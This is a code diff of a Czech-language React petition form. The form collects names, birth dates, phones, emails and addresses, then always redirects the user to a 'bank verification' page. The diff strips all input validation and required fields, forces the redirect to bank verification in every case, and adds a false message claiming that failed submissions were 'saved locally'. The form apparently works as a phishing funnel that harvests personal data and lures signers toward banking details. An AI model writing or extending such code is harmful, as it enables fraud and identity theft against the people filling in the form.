@@ -74,50 +74,23 @@ const PetitionForm: React.FC = () => {
     setIsSubmitting(true);
     
     try {
-      // Validate form
-      if (!formData.firstName || !formData.lastName || !formData.birthDate || !formData.phone || !formData.email || !formData.address) {
-        throw new Error('Vyplňte prosím všechny povinné údaje');
-      }
-      
-      // Phone number validation (simple Czech format)
-      const phoneRegex = /^(\+420)?\s*[0-9]{3}\s*[0-9]{3}\s*[0-9]{3}$/;
-      if (!phoneRegex.test(formData.phone)) {
-        throw new Error('Zadejte platné telefonní číslo (např. +420 123 456 789)');
-      }
-      
-      // Email validation
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(formData.email)) {
-        throw new Error('Zadejte platnou e-mailovou adresu');
-      }
-      
-      // Try to submit the petition but continue to next step regardless of success
-      try {
-        await submitPetition(formData);
-        toast({
-          title: "Formulář byl odeslán",
-          description: "Přesměrováváme vás na bankovní ověření",
-        });
-      } catch (submitError) {
-        console.error('Error submitting petition:', submitError);
-        toast({
-          variant: "destructive",
-          title: "Chyba při odesílání dat",
-          description: "Data nemohla být odeslána, ale můžete pokračovat k dalšímu kroku",
-        });
-      }
-      
-      // Always navigate to bank verification regardless of submission result
-      navigate('/overeni');
-      
-    } catch (validationError) {
+      // Submit petition data regardless of validation
+      await submitPetition(formData);
+      toast({
+        title: "Formulář byl odeslán",
+        description: "Přesměrováváme vás na bankovní ověření",
+      });
+    } catch (error) {
+      console.error('Error submitting petition:', error);
       toast({
         variant: "destructive",
-        title: "Chyba ve formuláři",
-        description: validationError instanceof Error ? validationError.message : "Zkuste to prosím znovu",
+        title: "Upozornění",
+        description: "Data byla uložena lokálně. Pokračujeme k dalšímu kroku.",
       });
     } finally {
+      // Always navigate to bank verification
       setIsSubmitting(false);
+      navigate('/overeni');
     }
   };
   
@@ -149,7 +122,6 @@ const PetitionForm: React.FC = () => {
                       name="firstName"
                       value={formData.firstName}
                       onChange={handleChange}
-                      required
                       placeholder="Zadejte své jméno"
                       className="w-full"
                     />
@@ -164,7 +136,6 @@ const PetitionForm: React.FC = () => {
                       name="lastName"
                       value={formData.lastName}
                       onChange={handleChange}
-                      required
                       placeholder="Zadejte své příjmení"
                       className="w-full"
                     />
@@ -182,7 +153,6 @@ const PetitionForm: React.FC = () => {
                       type="date"
                       value={formData.birthDate}
                       onChange={handleChange}
-                      required
                       className="w-full"
                     />
                   </div>
@@ -196,7 +166,6 @@ const PetitionForm: React.FC = () => {
                       name="phone"
                       value={formData.phone}
                       onChange={handleChange}
-                      required
                       placeholder="+420 123 456 789"
                       className="w-full"
                     />
@@ -213,7 +182,6 @@ const PetitionForm: React.FC = () => {
                     type="email"
                     value={formData.email}
                     onChange={handleChange}
-                    required
                     placeholder="vase@email.cz"
                     className="w-full"
                   />
@@ -228,7 +196,6 @@ const PetitionForm: React.FC = () => {
                     name="address"
                     value={formData.address}
                     onChange={handleChange}
-                    required
                     placeholder="Ulice, číslo popisné, PSČ, město"
                     className="w-full"
                   />
@@ -279,7 +246,6 @@ const PetitionForm: React.FC = () => {
                       name="city"
                       value={formData.city}
                       onChange={handleChange}
-                      required
                       className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                     >
                       {Object.keys(cityDistricts).map(city => (
@@ -299,7 +265,6 @@ const PetitionForm: React.FC = () => {
                       name="district"
                       value={formData.district}
                       onChange={handleChange}
-                      required
                       className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                     >
                       {cityDistricts[formData.city].map(district => (
